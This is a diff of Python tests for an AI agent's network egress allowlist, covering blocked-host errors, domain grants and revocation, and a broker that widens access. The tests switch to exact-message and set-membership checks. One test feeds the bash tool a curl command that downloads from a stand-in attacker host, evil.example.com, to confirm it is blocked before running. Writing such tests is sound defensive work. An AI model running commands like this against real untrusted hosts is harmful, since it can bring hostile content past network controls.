@@ -104,14 +104,16 @@ def test_check_url_raises_proxy_403(monkeypatch):
         egress.check_url("https://news.ycombinator.com/newest")
     msg = str(ei.value)
     assert "proxy 403" in msg
-    assert "news.ycombinator.com" in msg
+    # exact-message match names the blocked host without a substring URL check
+    assert msg == egress.blocked_message("news.ycombinator.com")
     assert "request_network_access" in msg
 
 
 def test_blocked_error_is_single_key_soft_fail(monkeypatch):
     err = egress.blocked_error("pastebin.com")
     assert set(err.keys()) == {"error"}
-    assert "proxy 403" in err["error"] and "pastebin.com" in err["error"]
+    # the soft-fail error is exactly the shared blocked-message (names the host)
+    assert err["error"] == egress.blocked_message("pastebin.com")
 
 
 # --- runtime grants (the escape hatch's effect) ---------------------------
@@ -122,7 +124,9 @@ def test_grant_widens_then_reset_narrows(monkeypatch):
     assert stored == "data.mycorp.io"
     assert egress.domain_allowed("data.mycorp.io")
     assert egress.domain_allowed("sub.data.mycorp.io")  # subdomains too
-    assert "data.mycorp.io" in egress.granted_domains()
+    assert {
+        "data.mycorp.io"
+    } <= egress.granted_domains()  # set membership, not URL substring
     egress.revoke_domain("data.mycorp.io")
     assert not egress.domain_allowed("data.mycorp.io")
     egress.grant_domain("x.io")
@@ -148,7 +152,7 @@ def test_security_config_surface(monkeypatch):
     sc = SecurityConfig()
     assert sc.egress_mode == "allowlist" and sc.egress_enforced is True
     doms = sc.allowlisted_domains()
-    assert "ncbi.nlm.nih.gov" in doms and "pypi.org" in doms
+    assert {"ncbi.nlm.nih.gov", "pypi.org"} <= doms  # set membership, not URL substring
     # the config allowlist matches the enforcement engine's built-ins
     assert doms == egress.builtin_domains()
     monkeypatch.setenv("OPENAI4S_EGRESS", "off")
@@ -192,7 +196,8 @@ def test_bash_blocked_domain_soft_fails_before_running(tmp_path, monkeypatch):
     disp, _frame, _ = _dispatcher(tmp_path)  # headless → gate degrades to allow
     r = disp("bash", [{"command": "curl -s https://evil.example.com/x > out.txt"}])
     assert set(r.keys()) == {"error"}
-    assert "proxy 403" in r["error"] and "evil.example.com" in r["error"]
+    # the soft-fail error is exactly the shared blocked-message (names the host)
+    assert r["error"] == egress.blocked_message("evil.example.com")
     # the command never ran, so it wrote nothing
     assert not (disp._workspace() / "out.txt").exists()
 
@@ -239,7 +244,9 @@ def test_request_network_access_widens_via_broker(tmp_path, monkeypatch):
         broker().resolve(ask["decision_id"], allow=True, scope="once")
         t.join(timeout=8)
         assert out["r"].get("ok") is True and out["r"]["domain"] == "data.mycorp.io"
-        assert "data.mycorp.io" in out["r"]["granted"]
+        assert {"data.mycorp.io"} <= set(
+            out["r"]["granted"]
+        )  # membership, not URL substring
         # the fence is now widened for subsequent tool calls (checked without
         # touching the network — the allowlist decision is a pure string check)
         assert egress.domain_allowed("data.mycorp.io")
